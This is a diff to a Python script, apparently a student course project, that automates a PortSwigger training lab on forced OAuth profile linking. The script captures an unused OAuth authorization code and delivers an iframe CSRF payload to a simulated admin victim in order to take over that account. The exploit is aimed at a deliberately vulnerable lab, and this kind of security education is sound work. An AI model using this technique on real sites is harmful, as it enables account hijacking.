@@ -2,10 +2,10 @@
 # CS595 Winter 2022 Final Project
 # https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking
 
-import re
 import urllib.parse
 import requests
 from bs4 import BeautifulSoup
+from urllib.parse import urlparse
 
 from Helpers import parseArgsForSite, uploadExploit, searchResponse, checkForSiteLiveness
 
@@ -14,39 +14,46 @@ checkForSiteLiveness(site)
 s = requests.Session()
 
 if __name__ == "__main__":
-    # Find social login link in account page
+    # Login to site with normal login flow to get attach social link
     login_url = f'https://{site}/login'
-    login_form = searchResponse(resp=s.get(login_url), search_for='form')
-    social_login_url = login_form.find('a', {'class': 'button'}).get('href')
-    oauth_site = social_login_url.split('/')[2]
-    print(f'Social login button url: {social_login_url}\noauth site: {oauth_site}\n')
+    resp = s.get(login_url)
+    csrf = searchResponse(resp, 'input', {'name': 'csrf'}).get('value')
+    login_data = {
+        'csrf': csrf,
+        'username': 'wiener',
+        'password': 'peter'
+    }
+    resp = s.post(login_url, data=login_data)
+    attach_social_url = searchResponse(resp, 'div', {'id': 'account-content'}).find('a').get('href')
+    print('attach social url: ', attach_social_url)
 
-    # Find sign-in page redirected to
-    resp = s.get(social_login_url, allow_redirects=False)
-    print(f'Social login responded with {resp.status_code}:\n{resp.text}')
+    # Get path 'attach social' request redirects to
+    resp = s.get(attach_social_url, allow_redirects=False)
     redirect_path_1 = searchResponse(resp, 'a').get('href')
-    print(f'Path redirecting to: {redirect_path_1}\n')
+    print(f'Path redirecting to (social login page): {redirect_path_1}\n')
 
-    # Found in the following GET that the POST endpoint just appends /login to `redirect_path_1`
-    # resp = s.get(f'https://{oauth_site}{redirect_path_1}')
-    # print(resp.text)
-
-    # POST sign-in data to social login w/ another user's valid login information
+    # login through oauth flow (social sign-in page & confirm oauth flow)
+    oauth_site = attach_social_url.split('/')[2]
     resp = s.post(f'https://{oauth_site}{redirect_path_1}/login', data={
         'username': 'peter.wiener',
         'password': 'hotdog'
     })
-    print(f'POST redirect_path_1/login responded with {resp.status_code}')
+    print(f'POST redirect_path_1/login responded with {resp.status_code} (redirect to confirm page)')
     resp = s.post(f'https://{oauth_site}{redirect_path_1}/confirm', allow_redirects=False)
-    print(f'Confirm OAuth page responded {resp.status_code}: {resp.url}')
-    # oauth code in URL of page redirected to. So grab that from the response url
-    oauth_code = urllib.parse.urlparse(resp.url).query.split('=')[1]
-    print(f'code found: {oauth_code}\n')
 
-    # exploit_payload = f'''
-    #     <iframe src="https://{site}/oauth-linking?code={oauth_code}"></iframe>
-    # '''
-    # resp = uploadExploit(s, site, exploit_payload, 'DELIVER_TO_VICTIM')
-    # if resp.status_code == 200:
-    #     print("Payload delivered to victim, login now.")
+    # Find validated oauth token in attempted redirect response
+    oauth_token_get_url = resp.headers['Location']
+    print(f'Confirm submission attempting to redirect to: {oauth_token_get_url}')
+    oauth_token = searchResponse(s.get(oauth_token_get_url, allow_redirects=False), 'a').get('href').split('code=')[1]
+    print(f'Found valid OAuth token! Token: {oauth_token}')
+
+    # Make admin validate with this token
+    exploit_payload = f'''
+        <iframe src="https://{site}/oauth-linking?code={oauth_token}"></iframe>
+    '''
+    resp = uploadExploit(s, site, exploit_payload, 'DELIVER_TO_VICTIM')
+    if resp.status_code == 200:
+        print("Payload delivered to victim, login now.")
     # Now, in UI should be able to click "Log in with social media" and get logged in as admin.
+    # Note: Not doing this part programmatically since I can just click 'login with social media', access
+    #   control panel, and delete Carlos manually, super easily.
